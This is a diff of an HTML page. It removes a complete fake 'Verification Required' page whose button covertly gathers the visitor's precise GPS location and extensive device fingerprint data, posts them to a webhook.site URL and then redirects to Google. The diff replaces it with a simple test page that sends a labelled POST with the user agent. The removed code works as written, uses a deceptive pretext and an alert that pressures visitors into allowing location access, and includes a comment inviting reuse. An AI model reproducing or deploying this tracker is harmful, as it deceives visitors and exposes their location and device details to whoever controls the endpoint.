@@ -1,170 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verification</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 100px;
-      background-color: #f5f5f5;
-    }
-    .box {
-      display: inline-block;
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    }
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #3498db;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-      display: none;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    #verifyBtn {
-      padding: 12px 20px;
-      background: #3498db;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-  </style>
+  <meta charset="utf-8">
+  <title>POST Test</title>
 </head>
 <body>
-
-  <div class="box">
-    <h2>Verification Required</h2>
-    <p>Tap the button below to continue.</p>
-    <button id="verifyBtn">Verify Now</button>
-    <div class="spinner" id="spinner"></div>
-  </div>
+  <h2>POST test</h2>
+  <p>Tap the button to send a test POST to your webhook.</p>
+  <button id="sendBtn">Send test POST</button>
 
   <script>
-    async function collectExtraData() {
-      const data = {};
+    document.getElementById('sendBtn').addEventListener('click', function () {
+      const payload = {
+        test: "github-pages-post-test",
+        time: new Date().toISOString(),
+        page: window.location.href,
+        ua: navigator.userAgent
+      };
 
-      // Basic browser / OS / device info
-      data.userAgent = navigator.userAgent || null;
-      data.platform = navigator.platform || null;
-      data.language = navigator.language || null;
-      data.languages = navigator.languages || null;
-
-      // Screen info
-      data.screenWidth = screen.width;
-      data.screenHeight = screen.height;
-      data.availWidth = screen.availWidth;
-      data.availHeight = screen.availHeight;
-      data.pixelRatio = window.devicePixelRatio || null;
-
-      // Window size
-      data.innerWidth = window.innerWidth;
-      data.innerHeight = window.innerHeight;
-      data.outerWidth = window.outerWidth;
-      data.outerHeight = window.outerHeight;
-
-      // Timezone
-      try {
-        data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      } catch (e) {
-        data.timezone = null;
-      }
-
-      // Network info (if supported)
-      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (conn) {
-        data.networkType = conn.effectiveType || null;
-        data.downlink = conn.downlink || null;
-        data.rtt = conn.rtt || null;
-      }
-
-      // Battery info (if supported)
-      try {
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          data.batteryLevel = battery.level;
-          data.batteryCharging = battery.charging;
-        }
-      } catch (e) {
-        data.batteryLevel = null;
-        data.batteryCharging = null;
-      }
-
-      // Hardware info (non‑identifying)
-      data.hardwareConcurrency = navigator.hardwareConcurrency || null;
-      data.deviceMemory = navigator.deviceMemory || null;
-
-      // Referrer / page info
-      data.referrer = document.referrer || null;
-      data.pageUrl = window.location.href;
-      data.pageTitle = document.title;
-
-      // Simple device type guess
-      const ua = navigator.userAgent || "";
-      data.deviceType =
-        /mobile|android|iphone|ipad|ipod/i.test(ua) ? "mobile" : "desktop/tablet";
-
-      return data;
-    }
-
-    document.getElementById("verifyBtn").onclick = async function () {
-      document.getElementById("spinner").style.display = "block";
-
-      const extraData = await collectExtraData();
-
-      navigator.geolocation.getCurrentPosition(
-        function (pos) {
-          const payload = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            time: new Date().toISOString(),
-            extra: extraData
-          };
-
-          fetch("https://webhook.site/f6fa034f-dd95-4933-8d07-803ff5c0ba0a", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          });
-
-          // Redirect after sending
-          window.location.href = "https://google.com"; // change this if you want
-        },
-        function (err) {
-          alert("Location access is required. Please tap 'Allow' when asked.");
-          document.getElementById("spinner").style.display = "none";
-
-          // Even if GPS fails, send the extra data so you still get device info
-          const payload = {
-            lat: null,
-            lon: null,
-            accuracy: null,
-            time: new Date().toISOString(),
-            error: err.message || "Location denied/failed",
-            extra: extraData
-          };
-
-          fetch("https://webhook.site/f6fa034f-dd95-4933-8d07-803ff5c0ba0a", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          });
-        },
-        { enableHighAccuracy: true }
-      );
-    };
+      fetch("https://webhook.site/redirect/f6fa034f-dd95-4933-8d07-803ff5c0ba0a", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        alert("POST sent. Check Webhook.site inbox.");
+      })
+      .catch(err => {
+        console.error("POST failed", err);
+        alert("POST failed. See console for details.");
+      });
+    });
   </script>
-
 </body>
 </html>
